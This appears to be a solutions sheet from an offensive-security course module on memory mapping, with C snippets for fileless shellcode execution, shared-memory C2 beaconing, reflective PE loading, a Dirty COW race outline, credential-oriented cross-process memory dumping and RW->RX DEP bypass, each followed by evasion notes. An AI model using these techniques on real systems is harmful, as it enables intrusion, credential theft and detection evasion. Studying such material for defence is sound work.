SOLUTIONS - MODULE 36 : MEMORY MAPPING

⚠️ AVERTISSEMENT : Techniques pour compréhension défensive uniquement.

SOLUTION 1 : FILELESS SHELLCODE EXECUTION

Linux :
void* mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC,
                 MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
memcpy(mem, shellcode, shellcode_len);
((void(*)())mem)();  // Cast to function pointer
munmap(mem, 4096);

Windows :
HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL,
                                PAGE_EXECUTE_READWRITE, 0, 4096, NULL);
LPVOID mem = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 4096);
memcpy(mem, shellcode, shellcode_len);
((void(*)())mem)();
UnmapViewOfFile(mem);

Bypass : DEP/NX détecte RWX, EDR behavioral analysis


SOLUTION 2 : SHARED MEMORY C2 IPC

Linux :
int shm = shm_open("/c2_ipc", O_CREAT | O_RDWR, 0666);
ftruncate(shm, 4096);
void* mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_SHARED, shm, 0);

sem_t* sem = sem_open("/c2_sem", O_CREAT, 0666, 1);
sem_wait(sem);
strcpy(mem, "beacon data");
sem_post(sem);

Windows :
HANDLE hMap = CreateFileMappingA(INVALID_HANDLE_VALUE, NULL,
                                 PAGE_READWRITE, 0, 4096, "Global\\C2_IPC");
LPVOID mem = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, 4096);

HANDLE mutex = CreateMutexA(NULL, FALSE, "Global\\C2_Mutex");
WaitForSingleObject(mutex, INFINITE);
strcpy(mem, "beacon data");
ReleaseMutex(mutex);

Bypass : Named objects visible, IPC monitoring détecte, use obfuscated names


SOLUTION 3 : MEMORY-MAPPED PE LOADER

int fd = open("payload.dll", O_RDONLY);
struct stat st;
fstat(fd, &st);
void* pe = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);

IMAGE_DOS_HEADER* dos = (IMAGE_DOS_HEADER*)pe;
IMAGE_NT_HEADERS* nt = (IMAGE_NT_HEADERS*)((char*)pe + dos->e_lfanew);

LPVOID base = VirtualAlloc(NULL, nt->OptionalHeader.SizeOfImage,
                           MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);


```c
// Copy headers
```
memcpy(base, pe, nt->OptionalHeader.SizeOfHeaders);


```c
// Copy sections
```
for (int i = 0; i < nt->FileHeader.NumberOfSections; i++) {
    IMAGE_SECTION_HEADER* section = ...;
    memcpy((char*)base + section->VirtualAddress,
           (char*)pe + section->PointerToRawData, section->SizeOfRawData);
}


```c
// Relocations, imports resolution, then execute
```

Bypass : Reflective loading = fileless, mais memory forensics trouve PE headers


SOLUTION 4 : COW EXPLOITATION

int fd = open("file.txt", O_RDONLY);
void* mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);

pid_t pid = fork();
if (pid == 0) {

```c
    // Child: modify triggers COW
```
    strcpy(mem, "MODIFIED");
    printf("Child: %s\n", (char*)mem);  // "MODIFIED"
} else {

```c
    // Parent: still sees original
```
    wait(NULL);
    printf("Parent: %s\n", (char*)mem);  // Original content
}

Race condition exploit (Dirty COW concept) :

```c
// Thread 1: madvise(mem, size, MADV_DONTNEED) in loop
// Thread 2: write() to /proc/self/mem at same offset
// Result: write to read-only COW page
```

Bypass : Kernel patches fixed Dirty COW, modern detection


SOLUTION 5 : CROSS-PROCESS MEMORY DUMP

Windows :
HANDLE hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
HANDLE hMap = CreateFileMapping(INVALID_HANDLE_VALUE, NULL,
                                PAGE_READWRITE, 0, dump_size, NULL);
LPVOID local = MapViewOfFile(hMap, FILE_MAP_ALL_ACCESS, 0, 0, dump_size);

ReadProcessMemory(hProc, remote_addr, local, dump_size, NULL);

```c
// Parse PE, extract .text, credentials, etc.
```

Linux :
ptrace(PTRACE_ATTACH, target_pid, NULL, NULL);
int mem_fd = open("/proc/PID/mem", O_RDONLY);
lseek(mem_fd, remote_addr, SEEK_SET);
read(mem_fd, buffer, size);

Bypass : Protected processes, credential guard, hypervisor protections


SOLUTION 6 : ANTI-FORENSICS MEMORY WIPE

void* mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
                 MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
mlock(mem, 4096);  // Prevent swap to disk


```c
// Use sensitive data
```
strcpy(mem, "SECRET_KEY");


```c
// Secure wipe
```
memset(mem, 0, 4096);
msync(mem, 4096, MS_SYNC | MS_INVALIDATE);

munlock(mem, 4096);
munmap(mem, 4096);


```c
// Verify not in swap
// strings /proc/kcore | grep SECRET_KEY
```

Bypass : Memory forensics peut trouver remnants, full disk encryption help


SOLUTION 7 : LARGE FILE PROCESSING

int fd = open("bigfile.dat", O_RDONLY);
struct stat st;
fstat(fd, &st);

size_t chunk_size = 1024 * 1024 * 100;  // 100MB chunks
for (off_t offset = 0; offset < st.st_size; offset += chunk_size) {
    size_t map_size = min(chunk_size, st.st_size - offset);
    void* mem = mmap(NULL, map_size, PROT_READ, MAP_PRIVATE, fd, offset);


```c
    // Process chunk
```
    process_data(mem, map_size);

    munmap(mem, map_size);
}

Performance :
mmap: O(1) access, lazy loading
read(): O(n) syscalls, buffer copies

Bypass : N/A (legitimate use)


SOLUTION 8 : MEMORY PERMISSION JUGGLING


```c
// RW then RX (DEP bypass)
void* mem = mmap(NULL, 4096, PROT_READ | PROT_WRITE,
```
                 MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);


```c
// Write shellcode
```
memcpy(mem, shellcode, shellcode_len);


```c
// Change to RX (not RWX!)
```
mprotect(mem, 4096, PROT_READ | PROT_EXEC);


```c
// Execute
```
((void(*)())mem)();

Windows equivalent :
VirtualAlloc(..., PAGE_READWRITE);

```c
// Write shellcode
```
VirtualProtect(..., PAGE_EXECUTE_READ, &old);

```c
// Execute
```

Compare :
- Direct RWX = flagged by DEP
- RW->RX = moins suspect mais EDR détecte mprotect calls

Bypass : Some EDRs allow RW->RX, kernel callbacks detect, CFG/CIG mitigations


RÉFÉRENCES :
- "Dirty COW" CVE-2016-5195 analysis
- Metasploit reflective DLL injection code
- Mimikatz lsass dumping techniques
- Linux kernel mmap() documentation
- Windows Memory Management internals

